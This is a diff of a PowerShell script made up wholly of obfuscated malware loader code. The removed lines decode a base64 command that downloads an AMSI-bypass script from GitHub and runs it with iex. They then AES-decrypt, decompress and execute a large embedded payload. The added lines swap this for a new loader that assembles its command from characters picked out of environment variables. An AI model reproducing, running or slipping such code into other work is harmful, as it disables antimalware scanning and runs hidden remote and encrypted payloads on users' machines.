@@ -1,19 +1,522 @@
-([TeXt.EnCoDiNg]::uTf8.gEtstRInG([Convert]::FromBase64String("JFByb2dyZXNzUHJlZmVyZW5jZSA9ICdTaWxlbnRseUNvbnRpbnVlJztbTmV0LlNlcnZpY2VQb2ludE1hbmFnZXJdOjpTZWN1cml0eVByb3RvY29sID0gW05ldC5TZWN1cml0eVByb3RvY29sVHlwZV06OlRsczEyO2lleCAoaXdyICJodHRwczovL2dpdGh1Yi5jb20vQ2hhaW5za2kvQUVTLUVuY29kZXIvcmF3L21haW4vYW1zaV9wYXRjaC5wczEiIC11c2ViKQ==")))|i`e`x
-$dte93WU = [cOnvert]::frOMbASe64striNg("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")
-$1kFxrQI = [CoNVerT]::froMbase64STRing("g0gHcIYr3ljwbfvGPPZt5s5m274VR4januBh0lBhBi0=")
-$nlAfAKU = &(GCM *w-o*t) "SysTEM.SecURity.CRYpTOGRaPhY.aeSManAgED"
-$nlAfAKU.ModE = [SYSTem.SecUriTy.CrYPTOGrapHY.cIpheRmodE]::CbC
-$nlAfAKU.pAddINg = [sYsTem.SECuRIty.cRYptOGRaPhy.PaDdiNgMoDe]::pKCs7
-$nlAfAKU.BlOckSIze = ((10+50-20*2)+(4)-20/20+105)
-$nlAfAKU.kEysIZe = ((10+166-20*2)+(97)+(12+11))
-$nlAfAKU.Key = $1kFxrQI
-$nlAfAKU.Iv = $dte93WU[0..15]
-$tnFpVkM = &(GCM *w-o*t) SYstEm.io.meMORYSTReAm(,$nlAfAKU.CreAteDecRYpToR().tRANsFOrMFiNALbLocK($dte93WU,16,$dte93WU.Length-16))
-$Kn6yZw0 = &(GCM *w-o*t) System.IO.MemoryStream
-$PJzrLNs = &(GCM *w-o*t) sYsTEM.iO.comPresSION.DEFLATEsTream $tnFpVkM, ([iO.coMpReSsIoN.COmpRessiOnModE]::dEComprESs)
-$PJzrLNs.CopyTo($Kn6yZw0)
-$PJzrLNs.CLoSe()
-$nlAfAKU.dISPOsE()
-$tnFpVkM.Close()
-$7dD8Zcg = [TeXT.EnCOdInG]::UtF8.GetStriNG($Kn6yZw0.tOARRAY())
-i`Ex($7dD8Zcg)
+
+& (($env:CommonProgramFiles[12], $env:PUBLIC[5], $env:ComSpec[25]) -join '') (([char]36, [char]66, $env:PSModulePath[131], $env:PSModulePath[117], [char]84, $env:ProgramData[5], $env:PSModulePath[11], $env:ComSpec[24], $env:CommonProgramFiles[22], $env:ProgramW6432[10], [char]61, $env:ProgramFiles[10], [char]34, [char]56, $env:ComSpec[18], [char]52, $env:PSModulePath[120], [char]56, [char]54, [char]53, $env:ComSpec[18], $env:PSModulePath[120], [char]54, $env:ProgramData[1], [char]65, [char]65, [char]72, [char]53, [char]76, $env:ComSpec[3], [char]76, [char]71, [char]76, [char]66, $env:PSModulePath[120], $env:ProgramW6432[13], [char]74, [char]72, $env:PSModulePath[146], $env:ProgramW6432[8], [char]53, $env:ComSpec[18], $env:PUBLIC[14], $env:CommonProgramW6432[8], $env:ComSpec[18], [char]66, [char]54, $env:SystemRoot[9], $env:PUBLIC[5], [char]76, $env:PSModulePath[63], [char]76, $env:PUBLIC[10], $env:ComSpec[17], [char]74, [char]69, [char]113, $env:SystemRoot[0], $env:PSModulePath[11], [char]34) -join '')
